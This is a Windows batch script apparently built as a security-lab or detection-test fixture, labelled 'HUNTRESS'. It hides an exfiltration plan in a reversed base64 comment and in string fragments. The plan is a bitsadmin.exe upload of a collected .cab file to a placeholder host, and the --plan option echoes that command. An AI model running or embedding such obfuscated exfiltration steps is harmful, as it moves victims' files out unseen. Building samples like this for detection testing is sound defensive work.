@echo off
setlocal EnableExtensions EnableDelayedExpansion
rem HUNTRESS-CODEC:plain_fragments|reverse
rem HUNTRESS-MATERIAL:ZGFvbHB1L2RpbGF2bmkuZWxwbWF4ZS5iY2YzMzYzYjNkLy86c3B0dGg9bHJ1X2Rhb2xwdXxiYWMuYmNmMzM2M2IzZC10Y2VsbG9jXGJhTHNzZXJ0bnVIXGNpbGJ1UFxzcmVzVVw6Qz1odGFwX2VjcnVvc3xiY2YzMzYzYjNkLW5naWFwbWFjPWRpX25naWFwbWFjfGVub249ZWdhdWduYWxfdHhlbnxlZ2F1Z25hbF9zc29yYz1ocGFyZ3wxPXRudW9jX2VnYXRzfGV4ZS5uaW1kYXN0aWI9cmV0cGFkYXxldG9tZXJfZGFvbHB1LHJlZnNuYXJ0X2VyYXBlcnAsbGFjb2xfZXRhY29sPXNwZXRzfDE9dg==
rem HUNTRESS-EXTENSION:cmd
if /i "%~1"=="--inspect" goto :HUNTRESS_INSPECT
if /i "%~1"=="--plan" goto :HUNTRESS_PLAN
exit /b 0
:HUNTRESS_INSPECT
set "FrAg0=v=1|steps=locate_local,prepare_transfer,upload_remote|adapter=bitsadmi"
set "FrAg1=n.exe|stage_count=1|graph=cross_language|next_language=none|campaign_i"
set "FrAg2=d=campaign-d3b3633fcb|source_path=C:\Users\Public\HuntressLab\collect-"
set "FrAg3=d3b3633fcb.cab|upload_url=https://d3b3633fcb.example.invalid/upload"
goto :HUNTRESS_SEPARATOR_DONE
ver >nul && rem HUNTRESS separator double ampersand
:HUNTRESS_SEPARATOR_DONE
set "neutral_environment_probe=29f7c1b6"
set "ReCoVeReD=!FrAg0!!FrAg1!!FrAg2!!FrAg3!"
echo(!ReCoVeReD!
exit /b 0
:HUNTRESS_PLAN
echo bitsadmin.exe upload C:\Users\Public\HuntressLab\collect-d3b3633fcb.cab to https://d3b3633fcb.example.invalid/upload
exit /b 0
